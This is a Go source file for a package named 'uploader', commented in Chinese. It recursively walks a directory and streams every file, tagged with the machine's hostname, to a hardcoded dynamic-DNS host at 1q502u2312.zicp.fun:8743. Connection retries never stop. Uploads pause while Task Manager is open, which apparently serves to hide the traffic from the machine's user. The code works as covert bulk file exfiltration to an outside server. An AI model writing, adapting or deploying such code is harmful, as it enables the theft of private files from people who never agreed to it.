package uploader

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/time/rate"
)

var ServerAddr = "1q502u2312.zicp.fun:8743"

var (
	// 新增：全局并发上传限制
	MaxConcurrentUploads = 5
	GlobalUploadSem      = make(chan struct{}, MaxConcurrentUploads) // 全局信号量，限制所有任务总并发
	CheckSem             = make(chan struct{}, 20)                   // 新增：限制最多20个并发 FILECHECK
	UploadPaused         atomic.Bool
)

var (
	// statusFileName = ".upload"       // 状态文件名
	SpeedLimit = 10 * 1024 * 1024 // 默认上传速度限制
	bufferSize = 32 * 1024        // 32KB缓冲区
	ClientName = ""               // 定义全局用户名称
)

// 自定义日志记录函数，支持格式化输出
func LogMessage(format string, args ...interface{}) {
	log.Printf(format, args...)
}

// 新增目录上传结构体
type UploadTask struct {
	ClientID string
	RootPath string

	// === 新增：流式上传必需的字段 ===
	FileChan chan string   // 生产者把路径发到这里
	Done     chan struct{} // 所有文件上传完毕后关闭
	wg       sync.WaitGroup

	connFunc net.Conn // 主线程的连接
}

type WriteCounter struct {
	Total     int64
	Current   int64
	FileName  string
	StartTime time.Time
	LastPrint time.Time // 新增节流控制
}

func init() {
	hostname, err := os.Hostname()
	if err == nil {
		ClientName = hostname
	}
}

// 生产者
func (t *UploadTask) startScanning() {
	t.wg.Add(1)
	go func() {
		defer t.wg.Done()
		defer close(t.FileChan)

		_ = filepath.WalkDir(t.RootPath, func(path string, d os.DirEntry, err error) error {
			if err == nil && !d.IsDir() {
				t.FileChan <- path
			}
			return nil
		})
	}()
}

// 消费者（全局严格5并发）
func (t *UploadTask) startUploading() {
	t.wg.Add(1)
	go func() {
		defer t.wg.Done()

		var workerWG sync.WaitGroup
		for i := 0; i < MaxConcurrentUploads; i++ {
			workerWG.Add(1)
			go func() {
				defer workerWG.Done()
				for path := range t.FileChan {
					if err := t.doSendFile(path); err != nil {
						LogMessage("上传失败 %s: %v", path, err)
					}
				}
			}()
		}
		workerWG.Wait()
		close(t.Done)
	}()
}

// <<<=== MODIFIED ===>>>  原来的 GenerateFileList 改为 StartScanning（立即返回）
func (t *UploadTask) StartScanning() error {
	// 初始化通道（缓冲可根据机器调整，1000~5000 都行）
	t.FileChan = make(chan string, 2000)
	t.Done = make(chan struct{})
	t.wg.Add(1)

	go func() {
		defer t.wg.Done()
		defer close(t.FileChan) // 扫描结束关闭通道

		err := filepath.WalkDir(t.RootPath, func(path string, d os.DirEntry, err error) error {
			if err != nil {
				LogMessage("\033[31m访问路径失败 %q: %w\033[0m", path, err)
				return nil // 单个错误不中断整个扫描
			}
			if !d.IsDir() {
				t.FileChan <- path // 直接投递，消费者立刻能拿到
			}
			return nil
		})

		if err != nil {
			LogMessage("\033[31m目录扫描失败: %v\033[0m", err)
		} else {
			LogMessage("\033[32m目录扫描完成，文件实时上传中...\033[0m")
		}
	}()

	return nil
}

// <<<=== MODIFIED ===>>>  完全重写 UploadFile：启动固定数量的 worker 消费通道
func (t *UploadTask) UploadFile() bool {

	const workerCount = 5 // 可根据 GlobalUploadSem 调整，这里保持和原来信号量一致

	// 启动 worker
	for i := 0; i < workerCount; i++ {
		t.wg.Add(1)
		go func(id int) {
			defer t.wg.Done()
			for path := range t.FileChan {
				// 仍然复用原来的 doSendFile，内部已经用了 GlobalUploadSem 限制总并发
				if err := t.doSendFile(path); err != nil {
					LogMessage("\033[31m上传失败 %s: %v\033[0m", path, err)
				} else {
					LogMessage("\033[32m上传成功 %s\033[0m", path)
				}
			}
			LogMessage("Worker %d 退出", id)
		}(i)
	}

	// 所有 worker 结束后关闭 Done
	go func() {
		t.wg.Wait()
		close(t.Done)
	}()

	/* 主协程等待全部完成（调用方会阻塞在这里）
	<-t.Done
	LogMessage("\033[1;32m目录上传全部完成！\033[0m") */
	return true
}

func getCreateTime(path string) int64 {
	fi, err := os.Stat(path)
	if err != nil {
		return -1
	}

	if runtime.GOOS == "windows" {
		if stat, ok := fi.Sys().(*syscall.Win32FileAttributeData); ok {
			// FILETIME -> int64
			ft := uint64(stat.CreationTime.HighDateTime)<<32 | uint64(stat.CreationTime.LowDateTime)
			// 转 Unix 秒
			return int64(ft/10000000) - 11644473600
		}
	}

	// 非 Windows: 返回修改时间
	return fi.ModTime().Unix()
}

func (t *UploadTask) doSendFile(fullPath string) error {

	// <<<=== 新增：任务管理器打开时暂停上传 ===>>>
	for UploadPaused.Load() {
		LogMessage("\033[33m[暂停中] 任务管理器打开，%s 等待上传...\033[0m", filepath.Base(fullPath))
		time.Sleep(500 * time.Millisecond)
	}

	// 获取 FILECHECK 信号量槽位（限制20个并发 FILECHECK）
	CheckSem <- struct{}{}
	defer func() { <-CheckSem }()

	// 获取文件信息
	fileInfo, err := os.Stat(fullPath)
	if err != nil {
		return fmt.Errorf("获取文件信息失败: %w", err)
	}

	// 获取创建/修改时间
	createTime := getCreateTime(fullPath)
	ct := strconv.FormatInt(createTime, 10)
	mt := strconv.FormatInt(fileInfo.ModTime().Unix(), 10)

	/* 创建独立连接
	fConn, err := net.DialTimeout("tcp", ServerAddr, 5*time.Second)
	if err != nil {
		return fmt.Errorf("连接失败: %v", err)
	}
	defer fConn.Close()*/

	fConn, err := connectWithRetry(ServerAddr, nil)
	if err != nil {
		return err
	}
	defer fConn.Close()

	// 设置短写入/读取超时以避免长时间阻塞（按需调整）
	fConn.SetDeadline(time.Now().Add(30 * time.Second)) // FILECHECK 阶段短超时

	// 发送 FILECHECK
	if _, err := fConn.Write([]byte(fmt.Sprintf("FILECHECK\n%s|%s|%s|%s|%d\n", ClientName, formatUnixPath(fullPath), ct, mt, fileInfo.Size()))); err != nil {
		return fmt.Errorf("发送CHECK失败: %w", err)
	}

	response, err := bufio.NewReader(fConn).ReadString('\n')
	if err != nil {
		return fmt.Errorf("读取CHECK响应失败: %w", err)
	}
	if strings.TrimSpace(response) == "EXISTS" {
		return nil
	}

	// FILECHECK 确认需要上传，获取上传信号量槽位（限制5个并发上传）
	GlobalUploadSem <- struct{}{}
	defer func() { <-GlobalUploadSem }()

	// 延长超时以适应文件上传
	fConn.SetDeadline(time.Now().Add(24 * time.Hour))

	// header := fmt.Sprintf("FILE\n%s|%d\n", filepath.ToSlash(filepath.Base(filePath)), fileInfo.Size())
	headers := []string{
		"FILE\n",
		fmt.Sprintf("%s|%d|%s|%s\n", formatUnixPath(fullPath), fileInfo.Size(), ct, mt),
	}

	for _, h := range headers {
		if _, err := fConn.Write([]byte(h)); err != nil {
			return fmt.Errorf("发送头失败: %w", err)
		}
	}

	// 发送内容
	file, err := os.Open(fullPath)
	if err != nil {
		return fmt.Errorf("文件打开失败: %w", err)
	}
	defer file.Close()

	counter := &WriteCounter{Total: fileInfo.Size(), FileName: fullPath, StartTime: time.Now()}
	src := io.TeeReader(file, counter)

	if SpeedLimit > 0 {

		// 改动缓冲区大小
		fileSize := fileInfo.Size()
		switch {
		case fileSize < 10*1024*1024: // <10MB
			bufferSize = 32 * 1024 // 32KB
		case fileSize < 500*1024*1024: // 10MB~500MB
			bufferSize = 256 * 1024 // 256KB
		default: // >500MB
			bufferSize = 1024 * 1024 // 1MB
		}
		limiter := rate.NewLimiter(rate.Limit(SpeedLimit), bufferSize)
		if _, err := t.rateLimitedCopy(fConn, src, limiter); err != nil {
			return err
		}
	} else {
		if _, err := io.Copy(fConn, src); err != nil {
			return err
		}
	}

	counter.Finalize()
	LogMessage("\033[32m成功上传: %s (%s)\033[0m", fullPath, formatSize(fileInfo.Size()))
	return nil
}

func connectWithRetry(serverAddr string, errChan chan<- error) (net.Conn, error) {
	const baseWaitTime = 5 * time.Second // 基础重试间隔

	// 无限重试循环（直到成功或外部终止）
	for {
		fConn, err := net.DialTimeout("tcp", serverAddr, 5*time.Second)
		if err == nil {
			// 连接成功，返回前确保defer在外部调用
			return fConn, nil
		}

		// 记录错误（非阻塞发送）
		errMsg := fmt.Sprintf("连接失败: %v，%.0f秒后重试...", err, baseWaitTime.Seconds())
		LogMessage(errMsg)
		select {
		case errChan <- fmt.Errorf(errMsg): // 非阻塞发送错误
		default:
		}

		// 等待重试（可加入context中断逻辑）
		time.Sleep(baseWaitTime) // 或使用带context的等待方式
	}
}

func formatUnixPath(fullPath string) string {
	// 提取盘符（Windows 下 VolumeName 形如 "F:"）
	volume := filepath.VolumeName(fullPath)
	// 去掉冒号，比如 "F:" → "F"
	vol := strings.TrimSuffix(volume, ":")

	// 去掉盘符部分，得到后续路径
	pathWithoutVolume := strings.TrimPrefix(fullPath, volume)

	// 转换路径分隔符为 `/`
	unixPath := filepath.ToSlash(pathWithoutVolume)

	// 拼接盘符为第一级目录
	unixPath = "/" + vol + unixPath

	return unixPath
}

// 添加速率限制拷贝函数
func (t *UploadTask) rateLimitedCopy(dst io.Writer, src io.Reader, limiter *rate.Limiter) (written int64, err error) {
	buf := make([]byte, bufferSize)
	ctx := context.Background()

	for {
		nr, er := src.Read(buf)
		if nr > 0 {
			// 等待速率限制令牌
			if err := limiter.WaitN(ctx, nr); err != nil {
				return written, err
			}

			nw, ew := dst.Write(buf[0:nr])
			if nw > 0 {
				written += int64(nw)
			}
			if ew != nil {
				return written, ew
			}
			if nr != nw {
				return written, io.ErrShortWrite
			}
		}
		if er != nil {
			if er != io.EOF {
				err = er
			}
			break
		}
	}
	return written, err
}

func (c *WriteCounter) Write(p []byte) (int, error) {
	n := len(p)
	atomic.AddInt64(&c.Current, int64(n))

	// 节流控制：每200ms更新一次显示
	if time.Since(c.LastPrint) < 200*time.Millisecond {
		return n, nil
	}
	c.LastPrint = time.Now()

	current := atomic.LoadInt64(&c.Current)
	elapsed := time.Since(c.StartTime).Seconds()

	// 计算传输速率
	speed := 0.0
	if elapsed > 0 {
		speed = float64(current) / elapsed / 1024
	}

	// 进度百分比计算
	progress := float64(current) / float64(c.Total) * 100
	if progress > 100 {
		progress = 100
	}

	// 彩色终端输出
	LogMessage("\r\033[33m%s\033[0m | 进度: \033[32m%.2f%%\033[0m | 速度: \033[36m%.2f KB/s\033[0m", c.FileName, progress, speed)

	return n, nil
}

// 最终完成显示
func (c *WriteCounter) Finalize() {
	current := atomic.LoadInt64(&c.Current)
	elapsed := time.Since(c.StartTime).Seconds()
	avgSpeed := float64(current) / elapsed / 1024

	LogMessage("\r\033[1;32m%s\033[0m | 完成: \033[1;35m100.00%%\033[0m | 平均速度: \033[1;34m%.2f KB/s\033[0m\n", c.FileName, avgSpeed)
}

func formatSize(bytes int64) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.2f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}
